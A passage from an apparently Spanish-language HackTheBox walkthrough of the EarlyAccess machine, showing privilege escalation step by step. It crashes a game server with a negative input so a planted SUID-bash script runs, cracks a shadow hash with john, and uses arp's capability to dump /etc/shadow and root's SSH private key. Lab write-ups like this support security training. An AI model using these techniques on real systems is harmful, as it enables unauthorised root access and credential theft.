<span id="cb37-10"><a href="#cb37-10" aria-hidden="true"></a><span class="st">individual files in /usr/share/doc/*/copyright.</span></span>
<span id="cb37-11"><a href="#cb37-11" aria-hidden="true"></a></span>
<span id="cb37-12"><a href="#cb37-12" aria-hidden="true"></a><span class="st">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span>
<span id="cb37-13"><a href="#cb37-13" aria-hidden="true"></a><span class="st">permitted by applicable law.</span></span>
<span id="cb37-14"><a href="#cb37-14" aria-hidden="true"></a><span class="st">game-tester@game-server:~$ </span></span></code></pre></div>
<p>Buscando por la maquina vemos una capabilitie con el comando <strong>getcap</strong>, la cual nos permite ejecutar el binario como el propietario.</p>
<div class="sourceCode" id="cb38"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ getcap -r / <span class="op">2&gt;</span>/dev/null</span></code></pre></div>
<table>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-r</td>
<td>Habilita la búsqueda recursiva, en este caso desde la raíz.</td>
</tr>
</tbody>
</table>
<div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true"></a><span class="ex">/usr/sbin/arp</span> =ep</span>
<span id="cb39-2"><a href="#cb39-2" aria-hidden="true"></a><span class="ex">/usr/bin/ping</span> = cap_net_raw+ep</span>
<span id="cb39-3"><a href="#cb39-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>En este caso nos permite ver el contenido de cualquier archivo.</p>
<img src="Img/Pasted image 20240513135545.png">
<p>Pero no podemos ejecutarlo ya que los únicos que pueden ejecutar el binario son el propietario <strong>root</strong> y los miembros del grupo <strong>adm</strong>.</p>
<div class="sourceCode" id="cb40"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ arp -v -f <span class="st">&quot;/etc/shadow&quot;</span></span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true"></a><span class="ex">-bash</span>: /usr/sbin/arp: Permission denied</span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ ls -l /usr/sbin/arp</span>
<span id="cb40-4"><a href="#cb40-4" aria-hidden="true"></a><span class="ex">-rwxr-x---</span> 1 root adm 67512 Sep 24  2018 /usr/sbin/arp</span>
<span id="cb40-5"><a href="#cb40-5" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Viendo los miembros del grupo <strong>adm</strong> vemos que el usuario <strong>game-adm</strong> es miembro.</p>
<div class="sourceCode" id="cb41"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ getent group adm</span>
<span id="cb41-2"><a href="#cb41-2" aria-hidden="true"></a><span class="ex">adm</span>:x:4:game-adm</span>
<span id="cb41-3"><a href="#cb41-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Por tanto, tenemos que ver una forma de poder llegar a pivotar como el usuario <strong>game-adm</strong> para poder ejecutar la capabilitie.</p>
<p>Vamos a utilizar la herramienta <strong>linpeas</strong> para ir enumerando vías potenciales para escalar privilegios.</p>
<img src="Img/Pasted image 20240513155919.png">
<img src="Img/Pasted image 20240513155951.png">
<p>Ejecutamos el <strong>linpeas</strong>.</p>
<img src="Img/Pasted image 20240513160648.png">
<p>Vemos un correo donde pone el nombre del usuario <strong>drew</strong> en <strong>/var/mail/</strong>.</p>
<div class="sourceCode" id="cb42"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ cat /var/mail/drew</span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true"></a><span class="ex">To</span>: <span class="op">&lt;</span>drew@earlyaccess.htb<span class="op">&gt;</span></span>
<span id="cb42-3"><a href="#cb42-3" aria-hidden="true"></a><span class="ex">Subject</span>: Game-server crash fixes</span>
<span id="cb42-4"><a href="#cb42-4" aria-hidden="true"></a><span class="ex">From</span>: game-adm <span class="op">&lt;</span>game-adm@earlyaccess.htb<span class="op">&gt;</span></span>
<span id="cb42-5"><a href="#cb42-5" aria-hidden="true"></a><span class="ex">Date</span>: Thu May 27 8:10:34 2021</span>
<span id="cb42-6"><a href="#cb42-6" aria-hidden="true"></a></span>
<span id="cb42-7"><a href="#cb42-7" aria-hidden="true"></a></span>
<span id="cb42-8"><a href="#cb42-8" aria-hidden="true"></a><span class="ex">Hi</span> Drew!</span>
<span id="cb42-9"><a href="#cb42-9" aria-hidden="true"></a></span>
<span id="cb42-10"><a href="#cb42-10" aria-hidden="true"></a><span class="ex">Thanks</span> again for taking the time to test this very early version of our newest project!</span>
<span id="cb42-11"><a href="#cb42-11" aria-hidden="true"></a><span class="ex">We</span> have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) </span>
<span id="cb42-12"><a href="#cb42-12" aria-hidden="true"></a><span class="ex">If</span> the game hangs now, the server will restart and be available again after about a minute.</span>
<span id="cb42-13"><a href="#cb42-13" aria-hidden="true"></a></span>
<span id="cb42-14"><a href="#cb42-14" aria-hidden="true"></a><span class="ex">If</span> you find any other problems, please don<span class="st">&#39;t hesitate to report them!</span></span>
<span id="cb42-15"><a href="#cb42-15" aria-hidden="true"></a></span>
<span id="cb42-16"><a href="#cb42-16" aria-hidden="true"></a><span class="st">Thank you for your efforts!</span></span>
<span id="cb42-17"><a href="#cb42-17" aria-hidden="true"></a><span class="st">Game-adm (and the entire EarlyAccess Studios team).</span></span>
<span id="cb42-18"><a href="#cb42-18" aria-hidden="true"></a></span>
<span id="cb42-19"><a href="#cb42-19" aria-hidden="true"></a><span class="st">drew@earlyaccess:~$ </span></span></code></pre></div>
<p>Al leer el mensaje nos damos cuenta de que han implementado como medida de seguridad el reiniciar automáticamente el servicio <strong>game-server</strong> cuando experimente una error.</p>
<p>Si miramos dentro del contenedor <strong>game-server</strong>, con el comando <strong>ss</strong> vemos que el puerto <strong>9999</strong> esta abierto internamente.</p>
<div class="sourceCode" id="cb43"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ ss -tnlp</span></code></pre></div>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-n</td>
<td>Para mostrar las direcciones IP y los números de puerto en formato numérico</td>
</tr>
<tr class="even">
<td>-l</td>
<td>Muestra solo las conexiones que están en un estado de “LISTEN”</td>
</tr>
<tr class="odd">
<td>-t</td>
<td>Muestra únicamente conexiones TCP</td>
</tr>
<tr class="even">
<td>-a</td>
<td>Muestra tanto conexiones TCP como UDP</td>
</tr>
</tbody>
</table>
<div class="sourceCode" id="cb44"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true"></a><span class="ex">State</span>      Recv-Q Send-Q                                               Local Address:Port                                                              Peer Address:Port              </span>
<span id="cb44-2"><a href="#cb44-2" aria-hidden="true"></a><span class="ex">LISTEN</span>     0      128                                                     127.0.0.11:33023                                                                        *:*                  </span>
<span id="cb44-3"><a href="#cb44-3" aria-hidden="true"></a><span class="ex">LISTEN</span>     0      128                                                              *:9999                                                                         *:*                  </span>
<span id="cb44-4"><a href="#cb44-4" aria-hidden="true"></a><span class="ex">LISTEN</span>     0      128                                                              *:22                                                                           *:*                  </span>
<span id="cb44-5"><a href="#cb44-5" aria-hidden="true"></a><span class="ex">LISTEN</span>     0      128                                                             :::22                                                                          :::*                  </span>
<span id="cb44-6"><a href="#cb44-6" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ </span></code></pre></div>
<p>Vamos a utilizar <strong>SSH</strong> para realizar un <strong>Port Forwarding</strong> dinámico.</p>
<div class="sourceCode" id="cb45"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true"></a>❯ <span class="fu">ssh</span> drew@10.10.11.110 -D 1080</span></code></pre></div>
<table>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-D</td>
<td>Se utiliza para habilitar el reenvío dinámico de puertos.</td>
</tr>
</tbody>
</table>
<p>Configuramos el navegador para que acceda a esa dirección.</p>
<img src="Img/Pasted image 20240513171153.png">
<p>Tras realizar la configuración ya podemos acceder al contenedor.</p>
<img src="Img/Pasted image 20240513171335.png">
<p>Si miramos en la raíz del contenedor que contiene el juego vemos un archivo <strong>entrypoint.sh</strong> y un directorio <strong>docker-entrypoint.d</strong>.</p>
<img src="Img/Pasted image 20240513180418.png">
<p>El <strong>entrypoint.sh</strong> es el archivo el cual va a indicar al contenedor que hacer después de arrancar.</p>
<div class="sourceCode" id="cb46"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ cat /entrypoint.sh </span>
<span id="cb46-2"><a href="#cb46-2" aria-hidden="true"></a><span class="co">#!/bin/bash</span></span>
<span id="cb46-3"><a href="#cb46-3" aria-hidden="true"></a><span class="kw">for</span> <span class="ex">ep</span> in /docker-entrypoint.d/*<span class="kw">;</span> <span class="kw">do</span></span>
<span id="cb46-4"><a href="#cb46-4" aria-hidden="true"></a><span class="kw">if</span><span class="bu"> [</span> <span class="ot">-x</span> <span class="st">&quot;</span><span class="va">${ep}</span><span class="st">&quot;</span><span class="bu"> ]</span>; <span class="kw">then</span></span>
<span id="cb46-5"><a href="#cb46-5" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Running: </span><span class="va">${ep}</span><span class="st">&quot;</span></span>
<span id="cb46-6"><a href="#cb46-6" aria-hidden="true"></a>    <span class="st">&quot;</span><span class="va">${ep}</span><span class="st">&quot;</span> <span class="kw">&amp;</span></span>
<span id="cb46-7"><a href="#cb46-7" aria-hidden="true"></a>  <span class="kw">fi</span></span>
<span id="cb46-8"><a href="#cb46-8" aria-hidden="true"></a><span class="kw">done</span></span>
<span id="cb46-9"><a href="#cb46-9" aria-hidden="true"></a><span class="fu">tail</span> -f /dev/null</span>
<span id="cb46-10"><a href="#cb46-10" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ </span></code></pre></div>
<p>Vemos que el archivo itera por cada valor existente en el directorio <strong>docker-entrypoint.d</strong> y si el archivo el archivo tiene los permisos necesarios, lo ejecuta.</p>
<p>Dentro del directorio <strong>docker-entrypoint.d</strong> solo hay un archivo, el cual realiza unas instrucciones.</p>
<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ ls -la /docker-entrypoint.d </span>
<span id="cb47-2"><a href="#cb47-2" aria-hidden="true"></a><span class="ex">total</span> 12</span>
<span id="cb47-3"><a href="#cb47-3" aria-hidden="true"></a><span class="ex">drwxrwxr-t</span> 2 root 1000 4096 May 13 15:19 .</span>
<span id="cb47-4"><a href="#cb47-4" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span> 1 root root 4096 May 13 07:51 ..</span>
<span id="cb47-5"><a href="#cb47-5" aria-hidden="true"></a><span class="ex">-rwxr-xr-x</span> 1 root root  100 May 13 15:19 node-server.sh</span>
<span id="cb47-6"><a href="#cb47-6" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ cat /docker-entrypoint.d/node-server.sh </span>
<span id="cb47-7"><a href="#cb47-7" aria-hidden="true"></a><span class="ex">service</span> ssh start</span>
<span id="cb47-8"><a href="#cb47-8" aria-hidden="true"></a></span>
<span id="cb47-9"><a href="#cb47-9" aria-hidden="true"></a><span class="bu">cd</span> /usr/src/app</span>
<span id="cb47-10"><a href="#cb47-10" aria-hidden="true"></a></span>
<span id="cb47-11"><a href="#cb47-11" aria-hidden="true"></a><span class="co"># Install dependencies</span></span>
<span id="cb47-12"><a href="#cb47-12" aria-hidden="true"></a><span class="ex">npm</span> install</span>
<span id="cb47-13"><a href="#cb47-13" aria-hidden="true"></a></span>
<span id="cb47-14"><a href="#cb47-14" aria-hidden="true"></a><span class="fu">sudo</span> -u node node server.js</span>
<span id="cb47-15"><a href="#cb47-15" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ </span></code></pre></div>
<p>Vemos la ruta <strong>/usr/src/app</strong>, si accedemos vemos un archivo <strong>server.js</strong>.</p>
<div class="sourceCode" id="cb48"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ ls -la /usr/src/app</span>
<span id="cb48-2"><a href="#cb48-2" aria-hidden="true"></a><span class="ex">total</span> 48</span>
<span id="cb48-3"><a href="#cb48-3" aria-hidden="true"></a><span class="ex">drwxrwxr-x</span>  5 root root  4096 Aug 18  2021 .</span>
<span id="cb48-4"><a href="#cb48-4" aria-hidden="true"></a><span class="ex">drwxr-xr-x</span>  1 root root  4096 Aug 19  2021 ..</span>
<span id="cb48-5"><a href="#cb48-5" aria-hidden="true"></a><span class="ex">drwxrwxr-x</span>  2 root root  4096 Aug 18  2021 assets</span>
<span id="cb48-6"><a href="#cb48-6" aria-hidden="true"></a><span class="ex">drwxrwxr-x</span> 68 root root  4096 Aug 18  2021 node_modules</span>
<span id="cb48-7"><a href="#cb48-7" aria-hidden="true"></a><span class="ex">-rw-rw-r--</span>  1 root root 18659 Aug 18  2021 package-lock.json</span>
<span id="cb48-8"><a href="#cb48-8" aria-hidden="true"></a><span class="ex">-rw-rw-r--</span>  1 root root   315 Aug 18  2021 package.json</span>
<span id="cb48-9"><a href="#cb48-9" aria-hidden="true"></a><span class="ex">-rw-rw-r--</span>  1 root root  2771 Aug 18  2021 server.js</span>
<span id="cb48-10"><a href="#cb48-10" aria-hidden="true"></a><span class="ex">drwxrwxr-x</span>  2 root root  4096 Aug 18  2021 views</span></code></pre></div>
<p>El archivo contiene el código fuente del juego.</p>
<img src="Img/Pasted image 20240513172327.png">
<p>Viendo esta parte del codigo ya podemos detectar una forma de provocar un error al servidor, como la aplicación no busca números negativos, el bucle <strong>while</strong> se ejecuta siempre que las rondas no sean cero y en cada ejecución el contador de rondas disminuye. Si usáramos un numero negativo <strong>-1</strong> en la cantidad de rondas, el bucle <strong>while</strong> se ejecutaría sin fin, lo que eventualmente colapsaría el servidor.</p>
<img src="Img/Pasted image 20240513172544.png">
<p>Pero en la pagina no podemos poner números negativos.</p>
<img src="Img/Pasted image 20240513174637.png">
<p>Si probamos desde el servidor, utilizando <strong>curl</strong> si que funciona.</p>
<img src="Img/Pasted image 20240513174246.png">
<img src="Img/Pasted image 20240513174318.png">
<img src="Img/Pasted image 20240513174330.png">
<img src="Img/Pasted image 20240513174341.png">
<div class="sourceCode" id="cb49"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ curl http://127.0.0.1:9999/autoplay -d <span class="st">&#39;rounds=-1&#39;</span></span>
<span id="cb49-2"><a href="#cb49-2" aria-hidden="true"></a><span class="ex">Connection</span> to 172.19.0.3 closed by remote host.</span>
<span id="cb49-3"><a href="#cb49-3" aria-hidden="true"></a><span class="ex">Connection</span> to 172.19.0.3 closed.</span>
<span id="cb49-4"><a href="#cb49-4" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-d</td>
<td>Se utiliza para enviar datos en una solicitud HTTP utilizando el método POST.</td>
</tr>
</tbody>
</table>
<p>Teniendo ya la capacidad de tirar el servidor ahora vamos a tratar de añadir un archivo al directorio <strong>docker-entrypoint.d</strong>, pero como no tenemos permisos de escritura es probable que se este utilizando una monturas para poder traer el directorio.</p>
<p>Si buscamos por el sistema, vemos el directorio, el cual tiene los permisos necesarios.</p>
<div class="sourceCode" id="cb50"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ find / -name <span class="st">&#39;node-server.sh&#39;</span> <span class="op">2&gt;</span>/dev/null</span>
<span id="cb50-2"><a href="#cb50-2" aria-hidden="true"></a><span class="ex">/opt/docker-entrypoint.d/node-server.sh</span></span>
<span id="cb50-3"><a href="#cb50-3" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ ls -l /opt/ <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;docker&quot;</span></span>
<span id="cb50-4"><a href="#cb50-4" aria-hidden="true"></a><span class="ex">drwxrwxr-t</span> 2 root drew 4096 May 13 18:06 docker-entrypoint.d</span>
<span id="cb50-5"><a href="#cb50-5" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Creamos un archivo dentro del directorio.</p>
<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:/opt/docker-entrypoint.d$ touch test</span>
<span id="cb51-2"><a href="#cb51-2" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:/opt/docker-entrypoint.d$ ls -l</span>
<span id="cb51-3"><a href="#cb51-3" aria-hidden="true"></a><span class="ex">total</span> 4</span>
<span id="cb51-4"><a href="#cb51-4" aria-hidden="true"></a><span class="ex">-rwxr-xr-x</span> 1 root root 100 May 13 18:08 node-server.sh</span>
<span id="cb51-5"><a href="#cb51-5" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 drew drew   0 May 13 18:08 test</span>
<span id="cb51-6"><a href="#cb51-6" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:/opt/docker-entrypoint.d$ </span></code></pre></div>
<p>Pero pasado un tiempo, el archivo es eliminado.</p>
<div class="sourceCode" id="cb52"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:/opt/docker-entrypoint.d$ ls -l</span>
<span id="cb52-2"><a href="#cb52-2" aria-hidden="true"></a><span class="ex">total</span> 4</span>
<span id="cb52-3"><a href="#cb52-3" aria-hidden="true"></a><span class="ex">-rwxr-xr-x</span> 1 root root 100 May 13 18:09 node-server.sh</span>
<span id="cb52-4"><a href="#cb52-4" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:/opt/docker-entrypoint.d$ </span></code></pre></div>
<p>Por tanto vamos a crear un bucle para estar creando el archivo que le añada el permiso <strong>SUID</strong> a al binario <strong>/bin/bash</strong> continuamente.</p>
<div class="sourceCode" id="cb53"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb53-1"><a href="#cb53-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:/opt/docker-entrypoint.d$ while true<span class="kw">;</span> <span class="kw">do</span> <span class="bu">echo</span> <span class="st">&#39;chmod u+s /bin/bash&#39;</span> <span class="op">&gt;</span> pwn<span class="kw">;</span> <span class="fu">chmod</span> +x pwn<span class="kw">;</span> <span class="fu">sleep</span> 1<span class="kw">;</span> <span class="kw">done</span></span></code></pre></div>
<p>Mientras por otro lado tiramos el servidor.</p>
<div class="sourceCode" id="cb54"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true"></a><span class="ex">game-tester@game-server</span>:~$ curl http://127.0.0.1:9999/autoplay -d <span class="st">&#39;rounds=-2&#39;</span></span>
<span id="cb54-2"><a href="#cb54-2" aria-hidden="true"></a><span class="ex">Connection</span> to 172.19.0.2 closed by remote host.</span>
<span id="cb54-3"><a href="#cb54-3" aria-hidden="true"></a><span class="ex">Connection</span> to 172.19.0.2 closed.</span>
<span id="cb54-4"><a href="#cb54-4" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ </span></code></pre></div>
<p>Ahora si accedemos de nuevo podemos ver que ha funciona ya que el binario <strong>/bin/bash</strong> tiene el permiso <strong>SUID</strong></p>
<div class="sourceCode" id="cb55"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:/opt/docker-entrypoint.d$ ssh game-tester@172.19.0.2</span>
<span id="cb55-2"><a href="#cb55-2" aria-hidden="true"></a><span class="ex">Linux</span> game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) <span class="ex">x86_64</span></span>
<span id="cb55-3"><a href="#cb55-3" aria-hidden="true"></a></span>
<span id="cb55-4"><a href="#cb55-4" aria-hidden="true"></a><span class="ex">The</span> programs included with the Debian GNU/Linux system are free software<span class="kw">;</span></span>
<span id="cb55-5"><a href="#cb55-5" aria-hidden="true"></a><span class="ex">the</span> exact distribution terms for each program are described in the</span>
<span id="cb55-6"><a href="#cb55-6" aria-hidden="true"></a><span class="ex">individual</span> files in /usr/share/doc/*/copyright.</span>
<span id="cb55-7"><a href="#cb55-7" aria-hidden="true"></a></span>
<span id="cb55-8"><a href="#cb55-8" aria-hidden="true"></a><span class="ex">Debian</span> GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
<span id="cb55-9"><a href="#cb55-9" aria-hidden="true"></a><span class="ex">permitted</span> by applicable law.</span>
<span id="cb55-10"><a href="#cb55-10" aria-hidden="true"></a><span class="ex">Last</span> login: Mon May 13 16:17:13 2024 from 172.19.0.1</span>
<span id="cb55-11"><a href="#cb55-11" aria-hidden="true"></a><span class="ex">-bash-4.4</span>$ ls -l /bin/bash</span>
<span id="cb55-12"><a href="#cb55-12" aria-hidden="true"></a><span class="ex">-rwsr-xr-x</span> 1 root root 1099016 May 15  2017 /bin/bash</span>
<span id="cb55-13"><a href="#cb55-13" aria-hidden="true"></a><span class="ex">-bash-4.4</span>$ </span></code></pre></div>
<p>Si miramos el <strong>/etc/shadow</strong> podemos ver la contraseña hacheada del usuario <strong>game-adm</strong>.</p>
<div class="sourceCode" id="cb56"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb56-1"><a href="#cb56-1" aria-hidden="true"></a><span class="ex">bash-4.4</span># grep <span class="st">&quot;game-adm&quot;</span> /etc/shadow</span>
<span id="cb56-2"><a href="#cb56-2" aria-hidden="true"></a><span class="ex">game-adm</span>:<span class="va">$6$zbRQg</span>.JO7dBWcZ<span class="va">$DWEKGCPIilhzWjJ</span>/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:18822:0:99999:7:::</span>
<span id="cb56-3"><a href="#cb56-3" aria-hidden="true"></a><span class="ex">bash-4.4</span># </span></code></pre></div>
<p>Tratamos de crackearla con <strong>john</strong>, y funciona.</p>
<div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true"></a>❯ <span class="ex">john</span> -w=/usr/share/wordlists/rockyou.txt hash</span>
<span id="cb57-2"><a href="#cb57-2" aria-hidden="true"></a><span class="ex">Warning</span>: detected hash type <span class="st">&quot;sha512crypt&quot;</span>, but the string is also recognized as <span class="st">&quot;HMAC-SHA256&quot;</span></span>
<span id="cb57-3"><a href="#cb57-3" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=HMAC-SHA256&quot;</span> option to force loading these as that type instead</span>
<span id="cb57-4"><a href="#cb57-4" aria-hidden="true"></a><span class="ex">Warning</span>: detected hash type <span class="st">&quot;sha512crypt&quot;</span>, but the string is also recognized as <span class="st">&quot;HMAC-SHA384&quot;</span></span>
<span id="cb57-5"><a href="#cb57-5" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--format=HMAC-SHA384&quot;</span> option to force loading these as that type instead</span>
<span id="cb57-6"><a href="#cb57-6" aria-hidden="true"></a><span class="ex">Using</span> default input encoding: UTF-8</span>
<span id="cb57-7"><a href="#cb57-7" aria-hidden="true"></a><span class="ex">Loaded</span> 1 password hash (sha512crypt, crypt(3) <span class="va">$6</span>$ [<span class="ex">SHA512</span> 256/256 AVX2 4x])</span>
<span id="cb57-8"><a href="#cb57-8" aria-hidden="true"></a><span class="ex">Cost</span> 1 (iteration count) <span class="ex">is</span> 5000 for all loaded hashes</span>
<span id="cb57-9"><a href="#cb57-9" aria-hidden="true"></a><span class="ex">Will</span> run 6 OpenMP threads</span>
<span id="cb57-10"><a href="#cb57-10" aria-hidden="true"></a><span class="ex">Press</span> <span class="st">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key for status</span>
<span id="cb57-11"><a href="#cb57-11" aria-hidden="true"></a><span class="ex">gamemaster</span>       (game-adm)</span>
<span id="cb57-12"><a href="#cb57-12" aria-hidden="true"></a><span class="ex">1g</span> 0:00:00:03 DONE (2024-05-13 18:29) <span class="ex">0.2824g/s</span> 3905p/s 3905c/s 3905C/s hondas..gotica</span>
<span id="cb57-13"><a href="#cb57-13" aria-hidden="true"></a><span class="ex">Use</span> the <span class="st">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span>
<span id="cb57-14"><a href="#cb57-14" aria-hidden="true"></a><span class="ex">Session</span> completed</span></code></pre></div>
<p>Nos conectamos como el usuario <strong>game-adm</strong> y funciona.</p>
<div class="sourceCode" id="cb58"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb58-1"><a href="#cb58-1" aria-hidden="true"></a><span class="ex">drew@earlyaccess</span>:~$ su game-adm</span>
<span id="cb58-2"><a href="#cb58-2" aria-hidden="true"></a><span class="ex">Password</span>: </span>
<span id="cb58-3"><a href="#cb58-3" aria-hidden="true"></a><span class="ex">game-adm@earlyaccess</span>:/home/drew$ whoami</span>
<span id="cb58-4"><a href="#cb58-4" aria-hidden="true"></a><span class="ex">game-adm</span></span>
<span id="cb58-5"><a href="#cb58-5" aria-hidden="true"></a><span class="ex">game-adm@earlyaccess</span>:/home/drew$ </span></code></pre></div>
<p>Y ya siendo el usuario <strong>game-adm</strong> ya podemos ejecutar la capabilitie.</p>
<div class="sourceCode" id="cb59"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb59-1"><a href="#cb59-1" aria-hidden="true"></a><span class="ex">game-adm@earlyaccess</span>:/home/drew$ /usr/sbin/arp -v -f <span class="st">&quot;/etc/shadow&quot;</span></span>
<span id="cb59-2"><a href="#cb59-2" aria-hidden="true"></a><span class="op">&gt;&gt;</span> <span class="ex">root</span>:<span class="va">$6$2</span>QbMgoSoxCmfitM7<span class="va">$fivhckW6N0Qk8Y3</span>.RDUy8iFKm/BcwEUkUDwKZa5s3LC6bhJuBwPxaqUpUJ76oOiI10i7CfcpPj1CcwVWsRLoz/:18871:0:99999:7:::</span>
<span id="cb59-3"><a href="#cb59-3" aria-hidden="true"></a><span class="ex">arp</span>: format error on line 1 of etherfile /etc/shadow !</span>
<span id="cb59-4"><a href="#cb59-4" aria-hidden="true"></a><span class="op">&gt;&gt;</span> <span class="ex">daemon</span>:*:18771:0:99999:7:::</span>
<span id="cb59-5"><a href="#cb59-5" aria-hidden="true"></a><span class="ex">arp</span>: format error on line 2 of etherfile /etc/shadow !</span>
<span id="cb59-6"><a href="#cb59-6" aria-hidden="true"></a><span class="op">&gt;&gt;</span> <span class="ex">bin</span>:*:18771:0:99999:7:::</span></code></pre></div>
<p>Tratamos de ver el ver la clave privada del usuario <strong>root</strong>.</p>
<div class="sourceCode" id="cb60"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb60-1"><a href="#cb60-1" aria-hidden="true"></a><span class="ex">game-adm@earlyaccess</span>:/home/drew$ /usr/sbin/arp -v -f <span class="st">&quot;/root/.ssh/id_rsa&quot;</span> <span class="op">2&gt;&amp;1</span> <span class="kw">|</span> <span class="fu">grep</span> -vE <span class="st">&quot;format|arp|host&quot;</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="st">&#39;s/&gt;&gt; //&#39;</span></span>
<span id="cb60-2"><a href="#cb60-2" aria-hidden="true"></a><span class="ex">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
<span id="cb60-3"><a href="#cb60-3" aria-hidden="true"></a><span class="ex">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span></span>
<span id="cb60-4"><a href="#cb60-4" aria-hidden="true"></a><span class="ex">NhAAAAAwEAAQAAAQEArIOXIvZx/5LspJVtY/Y5eT3B0g+hf1t4NEwLljBNrVzW3Y1JFDTL</span></span>
<span id="cb60-5"><a href="#cb60-5" aria-hidden="true"></a><span class="ex">bsqeX+jY1B0lLH361DrhTMra1KSHtTtk+Y6FLqUaYOnlxPlEnaldg/F9c+ch6bzgvEoYai</span></span>
